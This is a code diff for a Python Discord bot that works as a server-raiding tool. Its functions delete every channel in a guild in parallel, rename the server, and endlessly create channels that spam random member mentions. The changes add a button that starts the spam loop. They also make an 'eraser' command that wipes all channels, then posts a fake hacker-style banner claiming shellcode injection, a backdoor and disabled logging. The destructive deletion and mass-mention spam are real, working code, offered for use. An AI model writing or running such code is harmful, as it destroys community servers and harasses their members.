@@ -1,4 +1,5 @@
 import discord
+from discord import ui
 from discord.ext import commands
 import os
 import asyncio
@@ -20,7 +21,7 @@ COMBINED_TEXT = (
     ".∧_∧\n"
     " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
     " と ＿⌒))\n"
-    "        (_ﾉﾉ\n"
+    "    (_ﾉﾉ\n"
     "\n"
     "∧,＿,∧  バカが治りますよ～に♡\n"
     "（`・ω・)つ━☆・*.\n"
@@ -34,6 +35,22 @@ COMBINED_TEXT = (
 
 stop_flag = asyncio.Event()
 background_tasks = set()
+
+
+class StartButton(ui.View):
+    def __init__(self, guild):
+        super().__init__(timeout=None)
+        self.guild = guild
+
+    @ui.button(label="🚀 実行", style=discord.ButtonStyle.danger, emoji="⚡")
+    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        if not stop_flag.is_set() and background_tasks:
+            await interaction.followup.send("⚠️ 既に実行中です", ephemeral=True)
+            return
+        await interaction.followup.send("🔓 侵入承認…システム起動…", ephemeral=False)
+        await infinite_create_and_spam(self.guild)
+
 
 def random_mentions(guild: discord.Guild) -> str:
     members = [m for m in guild.members if not m.bot]
@@ -58,12 +75,9 @@ async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
 
 
 async def delete_all_channels_fast(guild: discord.Guild):
-    """✅ 最速並列削除＋取りこぼし自動消去"""
-    # 1回目：一斉削除（最速）
     tasks = [ch.delete() for ch in guild.channels]
     await asyncio.gather(*tasks, return_exceptions=True)
-    # 2回目：残ったチャンネルを再度削除（止まり防止）
-    await asyncio.sleep(0.03)
+    await asyncio.sleep(0.08)
     if guild.channels:
         tasks = [ch.delete() for ch in guild.channels]
         await asyncio.gather(*tasks, return_exceptions=True)
@@ -75,9 +89,7 @@ async def infinite_create_and_spam(guild: discord.Guild):
         await guild.edit(name=SERVER_NAME)
     except:
         pass
-
     await delete_all_channels_fast(guild)
-
     counter = 1
     while not stop_flag.is_set():
         try:
@@ -113,8 +125,43 @@ async def stop(ctx):
 
 @bot.command()
 async def eraser(ctx):
-    """✅ 最速削除＋報告なし"""
-    await delete_all_channels_fast(ctx.guild)
+    guild = ctx.guild
+    await delete_all_channels_fast(guild)
+    ch = await guild.create_text_channel("hacking出力画面")
+    hacker_code = "```ansi\n"
+    hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════════╗\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m║  ██████╗ ██╗ ██████╗██╗  ██╗███╗   ███╗ ██████╗ \x1b[38;5;51m ║\x1b[0m\n"
+    hacker_code += "\x1b[38;5;45m║  ██╔══██╗██║██╔════╝██║  ██║████╗ ████║██╔════╝ \x1b[38;5;45m ║\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m║  ██████╔╝██║██║     ███████║██╔████╔██║██║  ███╗\x1b[38;5;51m ║\x1b[0m\n"
+    hacker_code += "\x1b[38;5;45m║  ██╔═══╝ ██║██║     ██╔══██║██║╚██╔╝██║██║   ██║\x1b[38;5;45m ║\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m║  ██║     ██║╚██████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝\x1b[38;5;51m ║\x1b[0m\n"
+    hacker_code += "\x1b[38;5;45m║  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ \x1b[38;5;45m ║\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════════╝\x1b[0m\n"
+    hacker_code += "\n"
+    hacker_code += "\x1b[32m[root@tisn-core:~]#\x1b[0m ./sysinit --breach --level=MAX --stealth\n"
+    hacker_code += "\x1b[33m[001] \x1b[37m> Initializing exploit modules...        [\x1b[32mOK\x1b[37m]\x1b[0m\n"
+    hacker_code += "\x1b[33m[002] \x1b[37m> Bypassing firewall layer 1/3...         [\x1b[32mOK\x1b[37m]\x1b[0m\n"
+    hacker_code += "\x1b[33m[003] \x1b[37m> Decrypting payload...                    [\x1b[32mOK\x1b[37m]\x1b[0m\n"
+    hacker_code += "\x1b[33m[004] \x1b[37m> Injecting shellcode...                   [\x1b[32mOK\x1b[37m]\x1b[0m\n"
+    hacker_code += "\x1b[33m[005] \x1b[37m> Overriding security protocols...         [\x1b[32mOK\x1b[37m]\x1b[0m\n"
+    hacker_code += "\x1b[33m[006] \x1b[37m> Establishing backdoor tunnel...          [\x1b[32mOK\x1b[37m]\x1b[0m\n"
+    hacker_code += "\x1b[33m[007] \x1b[37m> Elevating privileges...                  [\x1b[32mOK\x1b[37m]\x1b[0m\n"
+    hacker_code += "\x1b[33m[008] \x1b[37m> Disabling audit logging...               [\x1b[32mOK\x1b[37m]\x1b[0m\n"
+    hacker_code += "\n"
+    hacker_code += "\x1b[38;5;196m███╗   ███╗███████╗██████╗ ██╗   ██╗\x1b[0m\n"
+    hacker_code += "\x1b[38;5;214m████╗ ████║██╔════╝██╔══██╗╚██╗ ██╔╝\x1b[0m\n"
+    hacker_code += "\x1b[38;5;226m██╔████╔██║█████╗  ██████╔╝ ╚████╔╝ \x1b[0m\n"
+    hacker_code += "\x1b[38;5;46m██║╚██╔╝██║██╔══╝  ██╔══██╗  ╚██╔╝  \x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m██║ ╚═╝ ██║███████╗██║  ██║   ██║   \x1b[0m\n"
+    hacker_code += "\x1b[38;5;45m╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   \x1b[0m\n"
+    hacker_code += "\n"
+    hacker_code += "\x1b[38;5;51m[SYSTEM]  ████████████████████████████ 100%\x1b[0m\n"
+    hacker_code += "\x1b[38;5;46m[STATUS]  ACCESS GRANTED — FULL CONTROL\x1b[0m\n"
+    hacker_code += "\x1b[38;5;226m[WARN]    Connection untraceable — NO LOGS\x1b[0m\n"
+    hacker_code += "\x1b[38;5;196m[INFO]    Awaiting execution trigger...\x1b[0m\n"
+    hacker_code += "```\n"
+    hacker_code += "**✅ 作成完了**\n"
+    await ch.send(hacker_code, view=StartButton(guild))
 
 
 @bot.command()
